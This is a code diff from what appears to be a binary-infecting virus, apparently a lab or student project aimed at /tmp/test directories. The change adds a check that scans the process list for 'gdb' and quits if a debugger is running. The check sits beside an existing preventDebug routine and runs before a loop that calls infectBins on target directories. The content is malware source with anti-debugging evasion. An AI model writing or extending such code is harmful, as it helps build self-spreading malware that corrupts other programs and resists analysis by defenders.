@@ -166,12 +166,32 @@ static int  preventDebug(void) {
   return (0);
 }
 
+static int checkProcess(void) {
+  PROCTAB *pt;
+  proc_t  *proc;
+
+  if ((pt = openproc(PROC_FILLCOM)) == NULL)
+    return (-1);
+  proc = NULL;
+  while ((proc = readproc(pt, proc)) != NULL) {
+    if (proc->cmdline != NULL)
+      if (strstr(proc->cmdline[0], "gdb") != NULL)
+        return (1);
+  }
+  free(proc);
+  closeproc(pt);
+  return (0);
+}
+
 int   main(void) {
   size_t  i;
   char    *infectDir[3] = {"/tmp/test", "/tmp/test2", NULL};
 
+  if (checkProcess() != 0)
+    return (1);
+  dprintf(1, "Checked process\n");
   if (preventDebug() == -1)
-    return (-1);
+    return (1);
   i = 0;
   while (infectDir[i] != NULL) {
     if (infectBins(infectDir[i]) == -1)
